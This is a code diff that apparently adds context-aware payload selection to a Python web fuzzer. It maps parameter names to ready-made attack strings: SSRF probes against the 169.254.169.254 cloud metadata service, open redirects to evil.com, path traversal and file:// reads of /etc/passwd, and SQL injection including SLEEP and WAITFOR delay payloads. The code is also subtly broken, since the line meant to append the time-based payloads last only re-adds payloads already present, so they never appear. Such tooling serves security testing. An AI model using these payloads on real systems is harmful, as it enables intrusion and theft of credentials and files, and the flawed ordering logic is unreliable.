@@ -156,6 +156,70 @@ _ALL_TRANSFORM_NAMES = [name for name, _ in _TRANSFORMS]
 _TRANSFORM_MAP = dict(_TRANSFORMS)
 
 
+# Context-aware payload priorities for smart fuzzing
+# Parameters matching these patterns get priority payloads
+_CONTEXT_PRIORITY_PAYLOADS: dict[str, list[str]] = {
+    # URL/redirect parameters → SSRF and Open Redirect first
+    "url": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1/", "//evil.com"],
+    "redirect": ["http://evil.com", "//evil.com", "/\\x5cevil.com"],
+    "next": ["http://evil.com", "//evil.com"],
+    "path": ["../../../etc/passwd", "....//....//etc/passwd"],
+    "file": ["file:///etc/passwd", "file:///c:/windows/win.ini"],
+    # ID/numeric parameters → SQLi first (fast payloads, not time-based)
+    "id": ["' OR '1'='1", "' OR 1=1--", "1 AND 1=1"],
+    "user": ["' OR '1'='1", "admin'--", "1 OR 1=1"],
+    "num": ["-1", "999999", "0"],
+}
+
+
+def _get_priority_payloads(param_name: str, category: str) -> list[str]:
+    """Get context-aware priority payloads for a parameter.
+    Returns appropriate payloads based on parameter name patterns.
+    """
+    param_lower = param_name.lower()
+    priority = []
+
+    # Check for URL/redirect/SSRF-related parameters
+    if any(kw in param_lower for kw in ["url", "redirect", "next", "return", "callback", "target"]):
+        priority.extend(_CONTEXT_PRIORITY_PAYLOADS.get("url", []))
+        priority.extend(_CONTEXT_PRIORITY_PAYLOADS.get("redirect", []))
+
+    # Check for path/file-related parameters
+    if any(kw in param_lower for kw in ["path", "file", "dir", "folder", "location"]):
+        priority.extend(_CONTEXT_PRIORITY_PAYLOADS.get("path", []))
+        priority.extend(_CONTEXT_PRIORITY_PAYLOADS.get("file", []))
+
+    # Check for ID/numeric parameters
+    if any(kw in param_lower for kw in ["id", "user", "num", "count", "page", "offset", "limit"]):
+        priority.extend(_CONTEXT_PRIORITY_PAYLOADS.get("id", []))
+        priority.extend(_CONTEXT_PRIORITY_PAYLOADS.get("user", []))
+        priority.extend(_CONTEXT_PRIORITY_PAYLOADS.get("num", []))
+
+    # Category-specific fast payloads (avoid heavy time-based until confirmed)
+    if category == "sqli":
+        # Fast error-based payloads first (no delays)
+        fast_sqli = [
+            "'",
+            "\"",
+            "' OR '1'='1",
+            "' AND 1=1--",
+            "' AND 1=2--",
+            "1' ORDER BY 10--",
+            "1' UNION SELECT NULL--",
+        ]
+        # Time-based SLEEP payloads go LAST (after fast ones confirm potential sqli)
+        time_based_sqli = [
+            "1' AND SLEEP(5)--",
+            "1; SELECT SLEEP(5)--",
+            "';WAITFOR DELAY '0:0:5'--",
+            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))xyz)--",
+        ]
+        priority = fast_sqli + [p for p in priority if p not in fast_sqli and p not in time_based_sqli]
+        priority.extend([p for p in time_based_sqli if p in priority])
+
+    return priority
+
+
 class Mutator:
     def mutations(
         self,
@@ -189,6 +253,40 @@ class Mutator:
                     result = _TRANSFORM_MAP[name](result)
                 if result != payload:
                     yield result
+
+    def context_aware_payloads(
+        self,
+        param_name: str,
+        category: str,
+        waf: str | None = None,
+    ) -> Iterator[dict]:
+        """Generate context-aware payloads for a specific parameter.
+        Prioritizes payloads based on parameter name patterns (e.g., 'url' param gets SSRF first).
+        Yields fast, low-hanging fruit payloads before heavy time-based ones.
+        """
+        # Get priority payloads for this parameter context
+        priority = _get_priority_payloads(param_name, category)
+
+        # Yield priority payloads first (with minimal transforms)
+        seen = set()
+        for payload in priority:
+            if payload not in seen:
+                seen.add(payload)
+                yield {
+                    "payload": payload,
+                    "category": category,
+                    "transform_chain": [],
+                    "priority": "high",
+                }
+
+        # Then yield the standard corpus (with transforms)
+        for mutated in self.corpus_mutations(category, waf=waf, max_transforms=1):
+            if mutated["payload"] not in seen:
+                seen.add(mutated["payload"])
+                yield {
+                    **mutated,
+                    "priority": "normal",
+                }
 
     def corpus_mutations(
         self,
